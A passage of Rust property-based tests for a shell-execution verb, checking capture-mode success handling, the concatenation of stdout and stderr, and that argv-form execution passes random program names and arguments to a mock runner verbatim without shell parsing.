            let rt = tokio::runtime::Builder::new_current_thread().build().unwrap();
            rt.block_on(async {
                for mode in [CaptureMode::Stdout, CaptureMode::Stderr, CaptureMode::Combined] {
                    let mock = MockShell::new().enqueue_result(
                        nika_kernel::process::ShellResult::new(
                            status, "o", "e", Duration::from_millis(1),
                        ),
                    );
                    let mut input = ExecInput::new("c");
                    input.capture = mode;
                    let ok = verb(mock).run(input).await.is_ok();
                    prop_assert_eq!(ok, status == 0);
                }
                let mock = MockShell::new().enqueue_result(
                    nika_kernel::process::ShellResult::new(
                        status, "o", "e", Duration::from_millis(1),
                    ),
                );
                let mut input = ExecInput::new("c");
                input.capture = CaptureMode::Structured;
                prop_assert!(verb(mock).run(input).await.is_ok());
                Ok(())
            })?;
        }

        /// Combined = stdout ⧺ stderr, exactly.
        #[test]
        fn combined_is_concatenation(stdout in ".{0,40}", stderr in ".{0,40}") {
            let result = nika_kernel::process::ShellResult::new(
                0, stdout.clone(), stderr.clone(), Duration::from_millis(1),
            );
            let expected = format!("{stdout}{stderr}");
            let combined_ok = matches!(
                shape_output(CaptureMode::Combined, false, result),
                ExecValue::Text(t) if t == expected
            );
            prop_assert!(combined_ok);
        }

        /// Combined under raw_capture = stdout octets ⧺ stderr octets —
        /// the SAME concatenation order as the text mode (one behavior).
        #[test]
        fn combined_raw_is_octet_concatenation(stdout in ".{0,40}", stderr in ".{0,40}") {
            let result = nika_kernel::process::ShellResult::new(
                0, stdout.clone(), stderr.clone(), Duration::from_millis(1),
            );
            let expected = [stdout.as_bytes(), stderr.as_bytes()].concat();
            let raw_ok = matches!(
                shape_output(CaptureMode::Combined, true, result),
                ExecValue::Raw(b) if b == expected
            );
            prop_assert!(raw_ok);
        }

        /// Argv injection-safety, over ALL inputs: for any program + args
        /// (NUL-free), every element reaches the runner as a LITERAL argv
        /// token (program + args verbatim) with the shell flag OFF — nothing
        /// is split, merged, or shell-parsed. The structural proof that the
        /// array form closes the injection surface for arbitrary payloads.
        #[test]
        fn argv_elements_reach_runner_verbatim_no_shell(
            program in "[a-zA-Z0-9_./-]{1,10}",
            args in proptest::collection::vec("[^\\x00]{0,16}", 0..5),
        ) {
            let rt = tokio::runtime::Builder::new_current_thread().build().unwrap();
            rt.block_on(async {
                let mock = MockShell::new().enqueue_ok("");
                let recorder = mock.clone();
                let mut argv = vec![program.clone()];
                argv.extend(args.clone());
                verb(mock).run(ExecInput::argv(argv)).await.expect("argv runs");
                let sent = recorder.executed_commands();
                prop_assert_eq!(sent.len(), 1);
                prop_assert!(!sent[0].shell, "argv form never uses the shell");
                prop_assert_eq!(&sent[0].program, &program);
                prop_assert_eq!(&sent[0].args, &args);
                Ok(())
            })?;
        }
    }
}
